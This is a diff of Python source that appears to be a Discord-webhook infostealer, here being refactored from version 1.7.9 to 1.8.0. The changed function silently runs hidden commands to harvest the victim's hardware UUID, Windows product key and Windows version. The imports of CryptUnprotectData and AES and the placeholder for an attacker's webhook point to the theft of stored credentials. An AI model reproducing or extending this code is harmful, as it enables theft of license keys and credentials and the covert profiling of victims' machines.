@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.7.9'
+__version__ = '1.8.0'
 __license__ = "GPL-3.0"
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -116,21 +116,23 @@ class Functions(object):
 
     @staticmethod
     def system_info() -> list:
-        cmd_to_exec = [
-            "wmic csproduct get uuid",
-            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
-            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
-        ]
-        for i, v in enumerate(cmd_to_exec):
-            try:
-                cmd_to_exec[i] = subprocess.check_output(v, creationflags=0x08000000)
-            except Exception:
-                cmd_to_exec[i] = "N/A"
+        try:
+            HWID = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
+        except Exception:
+            HWID = "N/A"
+        try:
+            wkey = subprocess.check_output(
+                "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
+                creationflags=0x08000000).decode().rstrip()
+        except Exception:
+            wkey = "N/A"
+        try:
+            winver = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
+                                             creationflags=0x08000000).decode().rstrip()
+        except Exception:
+            winver = "N/A"
 
-        HWID = cmd_to_exec[0].decode().split('\n')[1].strip()
-        wkey = cmd_to_exec[1].decode().rstrip()
-        productName = cmd_to_exec[2].decode().rstrip()
-        return [HWID, productName, wkey]
+        return [HWID, winver, wkey]
 
     @staticmethod
     def network_info() -> list:
